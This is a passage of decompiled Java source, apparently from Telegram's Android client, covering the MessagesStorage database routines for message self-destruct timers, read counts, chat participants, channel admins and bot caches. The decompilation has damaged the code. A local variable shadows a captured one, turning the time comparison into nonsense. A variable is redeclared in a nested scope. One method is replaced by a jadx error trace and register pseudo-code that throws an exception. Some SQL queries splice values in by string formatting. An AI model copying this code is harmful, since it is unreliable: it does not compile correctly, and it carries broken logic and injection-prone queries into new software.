                    HashMap<Long, Integer> hashMap = new HashMap();
                    hashMap.put(Long.valueOf(did), Integer.valueOf(count));
                    MessagesController.getInstance().processDialogsUpdateRead(null, hashMap);
                } catch (Exception e) {
                    FileLog.e(e);
                }
            }
        });
    }

    public void createTaskForMid(int messageId, int channelId, int time, int readTime, int ttl, boolean inner) {
        final int i = time;
        final int i2 = readTime;
        final int i3 = ttl;
        final int i4 = messageId;
        final int i5 = channelId;
        final boolean z = inner;
        this.storageQueue.postRunnable(new Runnable() {
            public void run() {
                try {
                    int i;
                    if (i > i2) {
                        i = i;
                    } else {
                        i = i2;
                    }
                    int minDate = i + i3;
                    SparseArray<ArrayList<Long>> messages = new SparseArray();
                    final ArrayList<Long> midsArray = new ArrayList();
                    long mid = (long) i4;
                    if (i5 != 0) {
                        mid |= ((long) i5) << 32;
                    }
                    midsArray.add(Long.valueOf(mid));
                    messages.put(minDate, midsArray);
                    AndroidUtilities.runOnUIThread(new Runnable() {
                        public void run() {
                            if (!z) {
                                MessagesStorage.getInstance().markMessagesContentAsRead(midsArray, 0);
                            }
                            NotificationCenter.getInstance().postNotificationName(NotificationCenter.messagesReadContent, new Object[]{midsArray});
                        }
                    });
                    SQLitePreparedStatement state = MessagesStorage.this.database.executeFast("REPLACE INTO enc_tasks_v2 VALUES(?, ?)");
                    for (int a = 0; a < messages.size(); a++) {
                        int key = messages.keyAt(a);
                        ArrayList<Long> arr = (ArrayList) messages.get(key);
                        for (int b = 0; b < arr.size(); b++) {
                            state.requery();
                            state.bindLong(1, ((Long) arr.get(b)).longValue());
                            state.bindInteger(2, key);
                            state.step();
                        }
                    }
                    state.dispose();
                    MessagesStorage.this.database.executeFast(String.format(Locale.US, "UPDATE messages SET ttl = 0 WHERE mid = %d", new Object[]{Long.valueOf(mid)})).stepThis().dispose();
                    MessagesController.getInstance().didAddedNewTask(minDate, messages);
                } catch (Exception e) {
                    FileLog.e(e);
                }
            }
        });
    }

    public void createTaskForSecretChat(int chatId, int time, int readTime, int isOut, ArrayList<Long> random_ids) {
        final ArrayList<Long> arrayList = random_ids;
        final int i = chatId;
        final int i2 = isOut;
        final int i3 = time;
        final int i4 = readTime;
        this.storageQueue.postRunnable(new Runnable() {
            public void run() {
                int minDate = Integer.MAX_VALUE;
                try {
                    SQLiteCursor cursor;
                    ArrayList<Long> arr;
                    SparseArray<ArrayList<Long>> messages = new SparseArray();
                    ArrayList<Long> midsArray = new ArrayList();
                    StringBuilder mids = new StringBuilder();
                    if (arrayList == null) {
                        cursor = MessagesStorage.this.database.queryFinalized(String.format(Locale.US, "SELECT mid, ttl FROM messages WHERE uid = %d AND out = %d AND read_state != 0 AND ttl > 0 AND date <= %d AND send_state = 0 AND media != 1", new Object[]{Long.valueOf(((long) i) << 32), Integer.valueOf(i2), Integer.valueOf(i3)}), new Object[0]);
                    } else {
                        String ids = TextUtils.join(",", arrayList);
                        cursor = MessagesStorage.this.database.queryFinalized(String.format(Locale.US, "SELECT m.mid, m.ttl FROM messages as m INNER JOIN randoms as r ON m.mid = r.mid WHERE r.random_id IN (%s)", new Object[]{ids}), new Object[0]);
                    }
                    while (cursor.next()) {
                        int ttl = cursor.intValue(1);
                        long mid = (long) cursor.intValue(0);
                        if (arrayList != null) {
                            midsArray.add(Long.valueOf(mid));
                        }
                        if (ttl > 0) {
                            int i;
                            if (i3 > i4) {
                                i = i3;
                            } else {
                                i = i4;
                            }
                            int date = i + ttl;
                            minDate = Math.min(minDate, date);
                            arr = (ArrayList) messages.get(date);
                            if (arr == null) {
                                arr = new ArrayList();
                                messages.put(date, arr);
                            }
                            if (mids.length() != 0) {
                                mids.append(",");
                            }
                            mids.append(mid);
                            arr.add(Long.valueOf(mid));
                        }
                    }
                    cursor.dispose();
                    if (arrayList != null) {
                        final ArrayList<Long> arrayList = midsArray;
                        AndroidUtilities.runOnUIThread(new Runnable() {
                            public void run() {
                                MessagesStorage.getInstance().markMessagesContentAsRead(arrayList, 0);
                                NotificationCenter.getInstance().postNotificationName(NotificationCenter.messagesReadContent, new Object[]{arrayList});
                            }
                        });
                    }
                    if (messages.size() != 0) {
                        MessagesStorage.this.database.beginTransaction();
                        SQLitePreparedStatement state = MessagesStorage.this.database.executeFast("REPLACE INTO enc_tasks_v2 VALUES(?, ?)");
                        for (int a = 0; a < messages.size(); a++) {
                            int key = messages.keyAt(a);
                            arr = (ArrayList) messages.get(key);
                            for (int b = 0; b < arr.size(); b++) {
                                state.requery();
                                state.bindLong(1, ((Long) arr.get(b)).longValue());
                                state.bindInteger(2, key);
                                state.step();
                            }
                        }
                        state.dispose();
                        MessagesStorage.this.database.commitTransaction();
                        MessagesStorage.this.database.executeFast(String.format(Locale.US, "UPDATE messages SET ttl = 0 WHERE mid IN(%s)", new Object[]{mids.toString()})).stepThis().dispose();
                        MessagesController.getInstance().didAddedNewTask(minDate, messages);
                    }
                } catch (Exception e) {
                    FileLog.e(e);
                }
            }
        });
    }

    private void updateDialogsWithReadMessagesInternal(ArrayList<Integer> messages, SparseArray<Long> inbox, SparseArray<Long> outbox, ArrayList<Long> mentions) {
        try {
            SQLitePreparedStatement state;
            HashMap<Long, Integer> dialogsToUpdate = new HashMap();
            HashMap<Long, Integer> dialogsToUpdateMentions = new HashMap();
            ArrayList<Integer> channelMentionsToReload = new ArrayList();
            SQLiteCursor cursor;
            String ids;
            if (messages == null || messages.isEmpty()) {
                int b;
                int key;
                long messageId;
                if (!(inbox == null || inbox.size() == 0)) {
                    for (b = 0; b < inbox.size(); b++) {
                        key = inbox.keyAt(b);
                        messageId = ((Long) inbox.get(key)).longValue();
                        cursor = this.database.queryFinalized(String.format(Locale.US, "SELECT COUNT(mid) FROM messages WHERE uid = %d AND mid > %d AND read_state IN(0,2) AND out = 0", new Object[]{Integer.valueOf(key), Long.valueOf(messageId)}), new Object[0]);
                        if (cursor.next()) {
                            dialogsToUpdate.put(Long.valueOf((long) key), Integer.valueOf(cursor.intValue(0)));
                        }
                        cursor.dispose();
                        state = this.database.executeFast("UPDATE dialogs SET inbox_max = max((SELECT inbox_max FROM dialogs WHERE did = ?), ?) WHERE did = ?");
                        state.requery();
                        state.bindLong(1, (long) key);
                        state.bindInteger(2, (int) messageId);
                        state.bindLong(3, (long) key);
                        state.step();
                        state.dispose();
                    }
                }
                if (!(mentions == null || mentions.size() == 0)) {
                    ArrayList<Long> arrayList = new ArrayList(mentions);
                    ids = TextUtils.join(",", mentions);
                    cursor = this.database.queryFinalized(String.format(Locale.US, "SELECT uid, read_state, out, mention, mid FROM messages WHERE mid IN(%s)", new Object[]{ids}), new Object[0]);
                    while (cursor.next()) {
                        long did = cursor.longValue(0);
                        arrayList.remove(Long.valueOf(cursor.longValue(4)));
                        if (cursor.intValue(1) < 2 && cursor.intValue(2) == 0 && cursor.intValue(3) == 1) {
                            Integer unread_count = (Integer) dialogsToUpdateMentions.get(Long.valueOf(did));
                            if (unread_count == null) {
                                SQLiteCursor cursor2 = this.database.queryFinalized("SELECT unread_count_i FROM dialogs WHERE did = " + did, new Object[0]);
                                int old_mentions_count = 0;
                                if (cursor2.next()) {
                                    old_mentions_count = cursor2.intValue(0);
                                }
                                cursor2.dispose();
                                dialogsToUpdateMentions.put(Long.valueOf(did), Integer.valueOf(Math.max(0, old_mentions_count - 1)));
                            } else {
                                dialogsToUpdateMentions.put(Long.valueOf(did), Integer.valueOf(Math.max(0, unread_count.intValue() - 1)));
                            }
                        }
                    }
                    cursor.dispose();
                    for (int a = 0; a < arrayList.size(); a++) {
                        int channelId = (int) (((Long) arrayList.get(a)).longValue() >> 32);
                        if (channelId > 0 && !channelMentionsToReload.contains(Integer.valueOf(channelId))) {
                            channelMentionsToReload.add(Integer.valueOf(channelId));
                        }
                    }
                }
                if (!(outbox == null || outbox.size() == 0)) {
                    for (b = 0; b < outbox.size(); b++) {
                        key = outbox.keyAt(b);
                        messageId = ((Long) outbox.get(key)).longValue();
                        state = this.database.executeFast("UPDATE dialogs SET outbox_max = max((SELECT outbox_max FROM dialogs WHERE did = ?), ?) WHERE did = ?");
                        state.requery();
                        state.bindLong(1, (long) key);
                        state.bindInteger(2, (int) messageId);
                        state.bindLong(3, (long) key);
                        state.step();
                        state.dispose();
                    }
                }
            } else {
                ids = TextUtils.join(",", messages);
                cursor = this.database.queryFinalized(String.format(Locale.US, "SELECT uid, read_state, out FROM messages WHERE mid IN(%s)", new Object[]{ids}), new Object[0]);
                while (cursor.next()) {
                    if (cursor.intValue(2) == 0 && cursor.intValue(1) == 0) {
                        long uid = cursor.longValue(0);
                        Integer currentCount = (Integer) dialogsToUpdate.get(Long.valueOf(uid));
                        if (currentCount == null) {
                            dialogsToUpdate.put(Long.valueOf(uid), Integer.valueOf(1));
                        } else {
                            dialogsToUpdate.put(Long.valueOf(uid), Integer.valueOf(currentCount.intValue() + 1));
                        }
                    }
                }
                cursor.dispose();
            }
            if (!(dialogsToUpdate.isEmpty() && dialogsToUpdateMentions.isEmpty())) {
                this.database.beginTransaction();
                if (!dialogsToUpdate.isEmpty()) {
                    state = this.database.executeFast("UPDATE dialogs SET unread_count = ? WHERE did = ?");
                    for (Entry<Long, Integer> entry : dialogsToUpdate.entrySet()) {
                        state.requery();
                        state.bindInteger(1, ((Integer) entry.getValue()).intValue());
                        state.bindLong(2, ((Long) entry.getKey()).longValue());
                        state.step();
                    }
                    state.dispose();
                }
                if (!dialogsToUpdateMentions.isEmpty()) {
                    state = this.database.executeFast("UPDATE dialogs SET unread_count_i = ? WHERE did = ?");
                    for (Entry<Long, Integer> entry2 : dialogsToUpdateMentions.entrySet()) {
                        state.requery();
                        state.bindInteger(1, ((Integer) entry2.getValue()).intValue());
                        state.bindLong(2, ((Long) entry2.getKey()).longValue());
                        state.step();
                    }
                    state.dispose();
                }
                this.database.commitTransaction();
            }
            MessagesController.getInstance().processDialogsUpdateRead(dialogsToUpdate, dialogsToUpdateMentions);
            if (!channelMentionsToReload.isEmpty()) {
                MessagesController.getInstance().reloadMentionsCountForChannels(channelMentionsToReload);
            }
        } catch (Exception e) {
            FileLog.e(e);
        }
    }

    public void updateDialogsWithReadMessages(final SparseArray<Long> inbox, final SparseArray<Long> outbox, final ArrayList<Long> mentions, boolean useQueue) {
        if (inbox.size() != 0 || !mentions.isEmpty()) {
            if (useQueue) {
                this.storageQueue.postRunnable(new Runnable() {
                    public void run() {
                        MessagesStorage.this.updateDialogsWithReadMessagesInternal(null, inbox, outbox, mentions);
                    }
                });
            } else {
                updateDialogsWithReadMessagesInternal(null, inbox, outbox, mentions);
            }
        }
    }

    public void updateChatParticipants(final TLRPC$ChatParticipants participants) {
        if (participants != null) {
            this.storageQueue.postRunnable(new Runnable() {
                public void run() {
                    try {
                        NativeByteBuffer data;
                        SQLiteCursor cursor = MessagesStorage.this.database.queryFinalized("SELECT info, pinned FROM chat_settings_v2 WHERE uid = " + participants.chat_id, new Object[0]);
                        TLRPC$ChatFull info = null;
                        ArrayList<User> loadedUsers = new ArrayList();
                        if (cursor.next()) {
                            data = cursor.byteBufferValue(0);
                            if (data != null) {
                                info = TLRPC$ChatFull.TLdeserialize(data, data.readInt32(false), false);
                                data.reuse();
                                info.pinned_msg_id = cursor.intValue(1);
                            }
                        }
                        cursor.dispose();
                        if (info instanceof TLRPC$TL_chatFull) {
                            info.participants = participants;
                            final TLRPC$ChatFull finalInfo = info;
                            AndroidUtilities.runOnUIThread(new Runnable() {
                                public void run() {
                                    NotificationCenter.getInstance().postNotificationName(NotificationCenter.chatInfoDidLoaded, new Object[]{finalInfo, Integer.valueOf(0), Boolean.valueOf(false), null});
                                }
                            });
                            SQLitePreparedStatement state = MessagesStorage.this.database.executeFast("REPLACE INTO chat_settings_v2 VALUES(?, ?, ?)");
                            data = new NativeByteBuffer(info.getObjectSize());
                            info.serializeToStream(data);
                            state.bindInteger(1, info.id);
                            state.bindByteBuffer(2, data);
                            state.bindInteger(3, info.pinned_msg_id);
                            state.step();
                            state.dispose();
                            data.reuse();
                        }
                    } catch (Exception e) {
                        FileLog.e(e);
                    }
                }
            });
        }
    }

    public void loadChannelAdmins(final int chatId) {
        this.storageQueue.postRunnable(new Runnable() {
            public void run() {
                try {
                    SQLiteCursor cursor = MessagesStorage.this.database.queryFinalized("SELECT uid FROM channel_admins WHERE did = " + chatId, new Object[0]);
                    ArrayList<Integer> ids = new ArrayList();
                    while (cursor.next()) {
                        ids.add(Integer.valueOf(cursor.intValue(0)));
                    }
                    cursor.dispose();
                    MessagesController.getInstance().processLoadedChannelAdmins(ids, chatId, true);
                } catch (Exception e) {
                    FileLog.e(e);
                }
            }
        });
    }

    public void putChannelAdmins(final int chatId, final ArrayList<Integer> ids) {
        this.storageQueue.postRunnable(new Runnable() {
            public void run() {
                try {
                    MessagesStorage.this.database.executeFast("DELETE FROM channel_admins WHERE did = " + chatId).stepThis().dispose();
                    MessagesStorage.this.database.beginTransaction();
                    SQLitePreparedStatement state = MessagesStorage.this.database.executeFast("REPLACE INTO channel_admins VALUES(?, ?)");
                    int date = (int) (System.currentTimeMillis() / 1000);
                    for (int a = 0; a < ids.size(); a++) {
                        state.requery();
                        state.bindInteger(1, chatId);
                        state.bindInteger(2, ((Integer) ids.get(a)).intValue());
                        state.step();
                    }
                    state.dispose();
                    MessagesStorage.this.database.commitTransaction();
                } catch (Exception e) {
                    FileLog.e(e);
                }
            }
        });
    }

    public void updateChannelUsers(final int channel_id, final ArrayList<TLRPC$ChannelParticipant> participants) {
        this.storageQueue.postRunnable(new Runnable() {
            public void run() {
                try {
                    long did = (long) (-channel_id);
                    MessagesStorage.this.database.executeFast("DELETE FROM channel_users_v2 WHERE did = " + did).stepThis().dispose();
                    MessagesStorage.this.database.beginTransaction();
                    SQLitePreparedStatement state = MessagesStorage.this.database.executeFast("REPLACE INTO channel_users_v2 VALUES(?, ?, ?, ?)");
                    int date = (int) (System.currentTimeMillis() / 1000);
                    for (int a = 0; a < participants.size(); a++) {
                        TLRPC$ChannelParticipant participant = (TLRPC$ChannelParticipant) participants.get(a);
                        state.requery();
                        state.bindLong(1, did);
                        state.bindInteger(2, participant.user_id);
                        state.bindInteger(3, date);
                        NativeByteBuffer data = new NativeByteBuffer(participant.getObjectSize());
                        participant.serializeToStream(data);
                        state.bindByteBuffer(4, data);
                        data.reuse();
                        state.step();
                        date--;
                    }
                    state.dispose();
                    MessagesStorage.this.database.commitTransaction();
                    MessagesStorage.this.loadChatInfo(channel_id, null, false, true);
                } catch (Exception e) {
                    FileLog.e(e);
                }
            }
        });
    }

    public void saveBotCache(final String key, final TLObject result) {
        if (result != null && !TextUtils.isEmpty(key)) {
            this.storageQueue.postRunnable(new Runnable() {
                public void run() {
                    try {
                        int currentDate = ConnectionsManager.getInstance().getCurrentTime();
                        if (result instanceof TLRPC$TL_messages_botCallbackAnswer) {
                            currentDate += ((TLRPC$TL_messages_botCallbackAnswer) result).cache_time;
                        } else if (result instanceof TLRPC$TL_messages_botResults) {
                            currentDate += ((TLRPC$TL_messages_botResults) result).cache_time;
                        }
                        SQLitePreparedStatement state = MessagesStorage.this.database.executeFast("REPLACE INTO botcache VALUES(?, ?, ?)");
                        NativeByteBuffer data = new NativeByteBuffer(result.getObjectSize());
                        result.serializeToStream(data);
                        state.bindString(1, key);
                        state.bindInteger(2, currentDate);
                        state.bindByteBuffer(3, data);
                        state.step();
                        state.dispose();
                        data.reuse();
                    } catch (Exception e) {
                        FileLog.e(e);
                    }
                }
            });
        }
    }

    public void getBotCache(final String key, final RequestDelegate requestDelegate) {
        if (key != null && requestDelegate != null) {
            final int currentDate = ConnectionsManager.getInstance().getCurrentTime();
            this.storageQueue.postRunnable(new Runnable() {
                public void run() {
                    TLObject result = null;
                    try {
                        MessagesStorage.this.database.executeFast("DELETE FROM botcache WHERE date < " + currentDate).stepThis().dispose();
                        SQLiteCursor cursor = MessagesStorage.this.database.queryFinalized(String.format(Locale.US, "SELECT data FROM botcache WHERE id = '%s'", new Object[]{key}), new Object[0]);
                        if (cursor.next()) {
                            try {
                                NativeByteBuffer data = cursor.byteBufferValue(0);
                                if (data != null) {
                                    int constructor = data.readInt32(false);
                                    if (constructor == TLRPC$TL_messages_botCallbackAnswer.constructor) {
                                        result = TLRPC$TL_messages_botCallbackAnswer.TLdeserialize(data, constructor, false);
                                    } else {
                                        result = TLRPC$messages_BotResults.TLdeserialize(data, constructor, false);
                                    }
                                    data.reuse();
                                }
                            } catch (Exception e) {
                                FileLog.e(e);
                            }
                        }
                        cursor.dispose();
                    } catch (Exception e2) {
                        FileLog.e(e2);
                    } finally {
                        requestDelegate.run(result, null);
                    }
                }
            });
        }
    }

    public void updateChatInfo(final TLRPC$ChatFull info, final boolean ifExist) {
        this.storageQueue.postRunnable(new Runnable() {
            public void run() {
                try {
                    SQLiteCursor cursor;
                    if (ifExist) {
                        cursor = MessagesStorage.this.database.queryFinalized("SELECT uid FROM chat_settings_v2 WHERE uid = " + info.id, new Object[0]);
                        boolean exist = cursor.next();
                        cursor.dispose();
                        if (!exist) {
                            return;
                        }
                    }
                    SQLitePreparedStatement state = MessagesStorage.this.database.executeFast("REPLACE INTO chat_settings_v2 VALUES(?, ?, ?)");
                    NativeByteBuffer data = new NativeByteBuffer(info.getObjectSize());
                    info.serializeToStream(data);
                    state.bindInteger(1, info.id);
                    state.bindByteBuffer(2, data);
                    state.bindInteger(3, info.pinned_msg_id);
                    state.step();
                    state.dispose();
                    data.reuse();
                    if (info instanceof TLRPC$TL_channelFull) {
                        cursor = MessagesStorage.this.database.queryFinalized("SELECT date, pts, last_mid, inbox_max, outbox_max, pinned, unread_count_i FROM dialogs WHERE did = " + (-info.id), new Object[0]);
                        if (cursor.next()) {
                            int inbox_max = cursor.intValue(3);
                            if (inbox_max <= info.read_inbox_max_id) {
                                int inbox_diff = info.read_inbox_max_id - inbox_max;
                                if (inbox_diff < info.unread_count) {
                                    info.unread_count = inbox_diff;
                                }
                                int dialog_date = cursor.intValue(0);
                                int pts = cursor.intValue(1);
                                long last_mid = cursor.longValue(2);
                                int outbox_max = cursor.intValue(4);
                                int pinned = cursor.intValue(5);
                                int mentions = cursor.intValue(6);
                                state = MessagesStorage.this.database.executeFast("REPLACE INTO dialogs VALUES(?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)");
                                state.bindLong(1, (long) (-info.id));
                                state.bindInteger(2, dialog_date);
                                state.bindInteger(3, info.unread_count);
                                state.bindLong(4, last_mid);
                                state.bindInteger(5, info.read_inbox_max_id);
                                state.bindInteger(6, Math.max(outbox_max, info.read_outbox_max_id));
                                state.bindLong(7, 0);
                                state.bindInteger(8, mentions);
                                state.bindInteger(9, pts);
                                state.bindInteger(10, 0);
                                state.bindInteger(11, pinned);
                                state.step();
                                state.dispose();
                            }
                        }
                        cursor.dispose();
                    }
                } catch (Exception e) {
                    FileLog.e(e);
                }
            }
        });
    }

    public void updateChannelPinnedMessage(final int channelId, final int messageId) {
        this.storageQueue.postRunnable(new Runnable() {
            public void run() {
                try {
                    NativeByteBuffer data;
                    SQLiteCursor cursor = MessagesStorage.this.database.queryFinalized("SELECT info, pinned FROM chat_settings_v2 WHERE uid = " + channelId, new Object[0]);
                    TLRPC$ChatFull info = null;
                    ArrayList<User> loadedUsers = new ArrayList();
                    if (cursor.next()) {
                        data = cursor.byteBufferValue(0);
                        if (data != null) {
                            info = TLRPC$ChatFull.TLdeserialize(data, data.readInt32(false), false);
                            data.reuse();
                            info.pinned_msg_id = cursor.intValue(1);
                        }
                    }
                    cursor.dispose();
                    if (info instanceof TLRPC$TL_channelFull) {
                        info.pinned_msg_id = messageId;
                        info.flags |= 32;
                        final TLRPC$ChatFull finalInfo = info;
                        AndroidUtilities.runOnUIThread(new Runnable() {
                            public void run() {
                                NotificationCenter.getInstance().postNotificationName(NotificationCenter.chatInfoDidLoaded, new Object[]{finalInfo, Integer.valueOf(0), Boolean.valueOf(false), null});
                            }
                        });
                        SQLitePreparedStatement state = MessagesStorage.this.database.executeFast("REPLACE INTO chat_settings_v2 VALUES(?, ?, ?)");
                        data = new NativeByteBuffer(info.getObjectSize());
                        info.serializeToStream(data);
                        state.bindInteger(1, channelId);
                        state.bindByteBuffer(2, data);
                        state.bindInteger(3, info.pinned_msg_id);
                        state.step();
                        state.dispose();
                        data.reuse();
                    }
                } catch (Exception e) {
                    FileLog.e(e);
                }
            }
        });
    }

    public void updateChatInfo(int chat_id, int user_id, int what, int invited_id, int version) {
        final int i = chat_id;
        final int i2 = what;
        final int i3 = user_id;
        final int i4 = invited_id;
        final int i5 = version;
        this.storageQueue.postRunnable(new Runnable() {
            public void run() {
                try {
                    NativeByteBuffer data;
                    SQLiteCursor cursor = MessagesStorage.this.database.queryFinalized("SELECT info, pinned FROM chat_settings_v2 WHERE uid = " + i, new Object[0]);
                    TLRPC$ChatFull info = null;
                    ArrayList<User> loadedUsers = new ArrayList();
                    if (cursor.next()) {
                        data = cursor.byteBufferValue(0);
                        if (data != null) {
                            info = TLRPC$ChatFull.TLdeserialize(data, data.readInt32(false), false);
                            data.reuse();
                            info.pinned_msg_id = cursor.intValue(1);
                        }
                    }
                    cursor.dispose();
                    if (info instanceof TLRPC$TL_chatFull) {
                        int a;
                        if (i2 == 1) {
                            for (a = 0; a < info.participants.participants.size(); a++) {
                                if (((TLRPC$ChatParticipant) info.participants.participants.get(a)).user_id == i3) {
                                    info.participants.participants.remove(a);
                                    break;
                                }
                            }
                        } else if (i2 == 0) {
                            Iterator it = info.participants.participants.iterator();
                            while (it.hasNext()) {
                                if (((TLRPC$ChatParticipant) it.next()).user_id == i3) {
                                    return;
                                }
                            }
                            TLRPC$TL_chatParticipant participant = new TLRPC$TL_chatParticipant();
                            participant.user_id = i3;
                            participant.inviter_id = i4;
                            participant.date = ConnectionsManager.getInstance().getCurrentTime();
                            info.participants.participants.add(participant);
                        } else if (i2 == 2) {
                            a = 0;
                            while (a < info.participants.participants.size()) {
                                TLRPC$ChatParticipant participant2 = (TLRPC$ChatParticipant) info.participants.participants.get(a);
                                if (participant2.user_id == i3) {
                                    TLRPC$ChatParticipant newParticipant;
                                    if (i4 == 1) {
                                        newParticipant = new TLRPC$TL_chatParticipantAdmin();
                                        newParticipant.user_id = participant2.user_id;
                                        newParticipant.date = participant2.date;
                                        newParticipant.inviter_id = participant2.inviter_id;
                                    } else {
                                        newParticipant = new TLRPC$TL_chatParticipant();
                                        newParticipant.user_id = participant2.user_id;
                                        newParticipant.date = participant2.date;
                                        newParticipant.inviter_id = participant2.inviter_id;
                                    }
                                    info.participants.participants.set(a, newParticipant);
                                } else {
                                    a++;
                                }
                            }
                        }
                        info.participants.version = i5;
                        final TLRPC$ChatFull finalInfo = info;
                        AndroidUtilities.runOnUIThread(new Runnable() {
                            public void run() {
                                NotificationCenter.getInstance().postNotificationName(NotificationCenter.chatInfoDidLoaded, new Object[]{finalInfo, Integer.valueOf(0), Boolean.valueOf(false), null});
                            }
                        });
                        SQLitePreparedStatement state = MessagesStorage.this.database.executeFast("REPLACE INTO chat_settings_v2 VALUES(?, ?, ?)");
                        data = new NativeByteBuffer(info.getObjectSize());
                        info.serializeToStream(data);
                        state.bindInteger(1, i);
                        state.bindByteBuffer(2, data);
                        state.bindInteger(3, info.pinned_msg_id);
                        state.step();
                        state.dispose();
                        data.reuse();
                    }
                } catch (Exception e) {
                    FileLog.e(e);
                }
            }
        });
    }

    public boolean isMigratedChat(final int chat_id) {
        final Semaphore semaphore = new Semaphore(0);
        final boolean[] result = new boolean[1];
        this.storageQueue.postRunnable(new Runnable() {
            /* JADX WARNING: inconsistent code. */
            /* Code decompiled incorrectly, please refer to instructions dump. */
            public void run() {
                /* JADX: method processing error */
/*
Error: jadx.core.utils.exceptions.JadxRuntimeException: Can't find block by offset: 0x0067 in list [B:23:0x0070]
	at jadx.core.utils.BlockUtils.getBlockByOffset(BlockUtils.java:43)
	at jadx.core.dex.instructions.IfNode.initBlocks(IfNode.java:60)
	at jadx.core.dex.visitors.blocksmaker.BlockFinish.initBlocksInIfNodes(BlockFinish.java:48)
	at jadx.core.dex.visitors.blocksmaker.BlockFinish.visit(BlockFinish.java:33)
	at jadx.core.dex.visitors.DepthTraversal.visit(DepthTraversal.java:31)
	at jadx.core.dex.visitors.DepthTraversal.visit(DepthTraversal.java:17)
	at jadx.core.dex.visitors.DepthTraversal.visit(DepthTraversal.java:14)
	at jadx.core.ProcessClass.process(ProcessClass.java:34)
	at jadx.core.ProcessClass.processDependencies(ProcessClass.java:56)
	at jadx.core.ProcessClass.process(ProcessClass.java:39)
	at jadx.api.JadxDecompiler.processClass(JadxDecompiler.java:282)
	at jadx.api.JavaClass.decompile(JavaClass.java:62)
	at jadx.api.JadxDecompiler.lambda$appendSourcesSave$0(JadxDecompiler.java:200)
*/
                /*
                r9 = this;
                r5 = 0;
                r6 = org.telegram.messenger.MessagesStorage.this;	 Catch:{ Exception -> 0x0068, all -> 0x0076 }
                r6 = r6.database;	 Catch:{ Exception -> 0x0068, all -> 0x0076 }
                r7 = new java.lang.StringBuilder;	 Catch:{ Exception -> 0x0068, all -> 0x0076 }
                r7.<init>();	 Catch:{ Exception -> 0x0068, all -> 0x0076 }
                r8 = "SELECT info FROM chat_settings_v2 WHERE uid = ";	 Catch:{ Exception -> 0x0068, all -> 0x0076 }
                r7 = r7.append(r8);	 Catch:{ Exception -> 0x0068, all -> 0x0076 }
                r8 = r7;	 Catch:{ Exception -> 0x0068, all -> 0x0076 }
                r7 = r7.append(r8);	 Catch:{ Exception -> 0x0068, all -> 0x0076 }
                r7 = r7.toString();	 Catch:{ Exception -> 0x0068, all -> 0x0076 }
                r8 = 0;	 Catch:{ Exception -> 0x0068, all -> 0x0076 }
                r8 = new java.lang.Object[r8];	 Catch:{ Exception -> 0x0068, all -> 0x0076 }
                r0 = r6.queryFinalized(r7, r8);	 Catch:{ Exception -> 0x0068, all -> 0x0076 }
                r3 = 0;	 Catch:{ Exception -> 0x0068, all -> 0x0076 }
                r4 = new java.util.ArrayList;	 Catch:{ Exception -> 0x0068, all -> 0x0076 }
                r4.<init>();	 Catch:{ Exception -> 0x0068, all -> 0x0076 }
                r6 = r0.next();	 Catch:{ Exception -> 0x0068, all -> 0x0076 }
                if (r6 == 0) goto L_0x0044;	 Catch:{ Exception -> 0x0068, all -> 0x0076 }
            L_0x0030:
                r6 = 0;	 Catch:{ Exception -> 0x0068, all -> 0x0076 }
                r1 = r0.byteBufferValue(r6);	 Catch:{ Exception -> 0x0068, all -> 0x0076 }
                if (r1 == 0) goto L_0x0044;	 Catch:{ Exception -> 0x0068, all -> 0x0076 }
            L_0x0037:
                r6 = 0;	 Catch:{ Exception -> 0x0068, all -> 0x0076 }
                r6 = r1.readInt32(r6);	 Catch:{ Exception -> 0x0068, all -> 0x0076 }
                r7 = 0;	 Catch:{ Exception -> 0x0068, all -> 0x0076 }
                r3 = org.telegram.tgnet.TLRPC$ChatFull.TLdeserialize(r1, r6, r7);	 Catch:{ Exception -> 0x0068, all -> 0x0076 }
                r1.reuse();	 Catch:{ Exception -> 0x0068, all -> 0x0076 }
            L_0x0044:
                r0.dispose();	 Catch:{ Exception -> 0x0068, all -> 0x0076 }
                r6 = r1;	 Catch:{ Exception -> 0x0068, all -> 0x0076 }
                r7 = 0;	 Catch:{ Exception -> 0x0068, all -> 0x0076 }
                r8 = r3 instanceof org.telegram.tgnet.TLRPC$TL_channelFull;	 Catch:{ Exception -> 0x0068, all -> 0x0076 }
                if (r8 == 0) goto L_0x0053;	 Catch:{ Exception -> 0x0068, all -> 0x0076 }
            L_0x004e:
                r8 = r3.migrated_from_chat_id;	 Catch:{ Exception -> 0x0068, all -> 0x0076 }
                if (r8 == 0) goto L_0x0053;	 Catch:{ Exception -> 0x0068, all -> 0x0076 }
            L_0x0052:
                r5 = 1;	 Catch:{ Exception -> 0x0068, all -> 0x0076 }
            L_0x0053:
                r6[r7] = r5;	 Catch:{ Exception -> 0x0068, all -> 0x0076 }
                r5 = r2;	 Catch:{ Exception -> 0x0068, all -> 0x0076 }
                if (r5 == 0) goto L_0x005e;	 Catch:{ Exception -> 0x0068, all -> 0x0076 }
            L_0x0059:
                r5 = r2;	 Catch:{ Exception -> 0x0068, all -> 0x0076 }
                r5.release();	 Catch:{ Exception -> 0x0068, all -> 0x0076 }
            L_0x005e:
                r5 = r2;
                if (r5 == 0) goto L_0x0067;
            L_0x0062:
                r5 = r2;
                r5.release();
            L_0x0067:
                return;
            L_0x0068:
                r2 = move-exception;
                org.telegram.messenger.FileLog.e(r2);	 Catch:{ Exception -> 0x0068, all -> 0x0076 }
                r5 = r2;
                if (r5 == 0) goto L_0x0067;
            L_0x0070:
                r5 = r2;
                r5.release();
                goto L_0x0067;
            L_0x0076:
                r5 = move-exception;
                r6 = r2;
                if (r6 == 0) goto L_0x0080;
            L_0x007b:
                r6 = r2;
                r6.release();
            L_0x0080:
                throw r5;
                */
                throw new UnsupportedOperationException("Method not decompiled: org.telegram.messenger.MessagesStorage.45.run():void");
            }
        });
        try {
            semaphore.acquire();
        } catch (Exception e) {
            FileLog.e(e);
        }
        return result[0];
    }

    public void loadChatInfo(int chat_id, Semaphore semaphore, boolean force, boolean byChannelUsers) {
        final int i = chat_id;
        final Semaphore semaphore2 = semaphore;
        final boolean z = force;
        final boolean z2 = byChannelUsers;
        this.storageQueue.postRunnable(new Runnable() {
            public void run() {
                MessageObject pinnedMessageObject = null;
                TLRPC$ChatFull info = null;
                ArrayList<User> loadedUsers = new ArrayList();
                try {
                    NativeByteBuffer data;
                    SQLiteCursor cursor = MessagesStorage.this.database.queryFinalized("SELECT info, pinned FROM chat_settings_v2 WHERE uid = " + i, new Object[0]);
                    if (cursor.next()) {
                        data = cursor.byteBufferValue(0);
                        if (data != null) {
